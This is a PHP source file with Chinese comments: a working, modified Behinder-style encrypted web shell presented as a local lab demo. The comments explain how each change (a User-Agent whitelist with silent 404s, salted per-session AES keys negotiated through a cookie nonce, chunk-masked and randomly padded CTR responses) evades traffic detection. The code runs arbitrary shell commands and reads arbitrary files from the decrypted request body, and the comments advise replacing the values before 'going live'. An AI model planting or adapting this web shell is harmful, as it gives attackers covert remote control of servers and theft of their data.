<?php
// 魔改冰蝎型加密马 demo（本地实验环境）：三处魔改打掉默认特征
// 声明：仅用于本地实验环境学习对照；demo 密钥/盐/UA 池为示例值，上线需全量替换。
//
// 版本谱系（密钥演进）：
//   v2/v3：AES-128-CBC/GCM + 静态密钥 = MD5(密码) 前 16 位——流量设备拿到密码即可推解；
//   v4.x：动态密钥协商（首包交换随机数，两侧派生会话密钥）；
//   v4.0.6：动态密钥协商 + 虚拟终端/Socks——魔改价值=协议自持（代码在手随时更新对抗）。
//
// 原版特征 → 本文件魔改：
//   ① 密钥=MD5(密码)前16位（静态可推）→ 密钥派生加盐 + 首包 nonce 协商（每会话密钥互异）
//   ② 默认 UA/Header 弱特征（任意请求放行）→ UA 白名单池校验 + 自定义协商标头
//   ③ AES-CBC 固定结构回传 → CTR 加密 + 分块异或掩码 + 随机填充（包型/长度打散）

// ========== ② UA 池：客户端从池中随机轮换 UA，池外一律 404 ==========
// 原版弱特征：任意 UA 均放行（扫描器/流量设备重放无需伪装即可触达）。
// 魔改：UA 必须在池内——同时挡住默认 UA 扫描与不经客户端重放的流量。
$UA_POOL = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0',
];
if (!in_array($_SERVER['HTTP_USER_AGENT'] ?? '', $UA_POOL, true)) {
    http_response_code(404); exit;       // 池外 UA：静默 404（无错误面泄露）
}

// ========== ① 密钥派生加盐 + 首包 nonce 协商 ==========
$S = 'x9k2';                             // 魔改盐：密钥 = md5(sess . SALT . nonce)
$H = 'HTTP_X_T';                         // 协商标头改为自定义名（去默认 Header 面）
$sess = $_SERVER[$H] ?? '';
if ($sess === '') { http_response_code(404); exit; }
$nonce = $_COOKIE['n'] ?? '';
if ($nonce === '') {
    // 首包协商：无 nonce → 服务端下发随机 nonce（熵源可自定义）并回吐 Set-Cookie；
    // 客户端后续业务包携带该 nonce，两侧按同一规则派生会话密钥——静态密钥特征消除
    $nonce = bin2hex(random_bytes(8));
    header('Set-Cookie: n=' . $nonce . '; Path=/; HttpOnly');
    http_response_code(200);
    exit;
}
$key = substr(md5($sess . $S . $nonce), 0, 16);   // 会话密钥（16 字节）
$iv  = str_pad(substr($nonce, 0, 16), 16, '0');   // 请求 IV 由 nonce 派生（重放包无法复用）

$in = file_get_contents('php://input');
$pt = openssl_decrypt($in, 'AES-128-CTR', $key, OPENSSL_RAW_DATA, $iv);
if ($pt === false) { http_response_code(500); exit; }

// 协议头：3 字节功能码 + 参数体（与客户端约定，非冰蝎原生格式）
$fn  = substr($pt, 0, 3);
$arg = substr($pt, 3);
$m = ['cmd' => function($x){ return shell_exec($x); },
      'red' => function($x){ return @file_get_contents($x); }];
$r = isset($m[$fn]) ? $m[$fn]($arg) : '';
$r = ($r === false || $r === null) ? '' : (string)$r;

// ========== ③ 回传结构变形：CTR 加密 + 分块异或掩码 + 随机尾填充 ==========
// 检测侧视角：原版"base64 明文结构"直接暴露包型；本变形后只可见高熵 base64 包。
$body = $r . random_bytes(rand(0, 8));                      // 随机尾填充：长度抖动
$iv2  = substr(md5($nonce . 'resp'), 0, 16);               // 回传 IV 与请求 IV 分离（nonce 派生）
$ct   = openssl_encrypt($body, 'AES-128-CTR', $key, OPENSSL_RAW_DATA, $iv2);
if ($ct === false) { http_response_code(500); exit; }
$chunk = 256;                                               // 分块粒度（可调）
$out = '';
for ($i = 0; $i < strlen($ct); $i += $chunk) {
    $blk  = substr($ct, $i, $chunk);
    $mask = str_repeat(md5($key . $i, true), intdiv(strlen($blk) + 15, 16));
    $out .= $blk ^ substr($mask, 0, strlen($blk));          // 掩码随块号派生：块间互异，
                                                            // 同一结果两次回传密文互异
}
echo base64_encode($out);
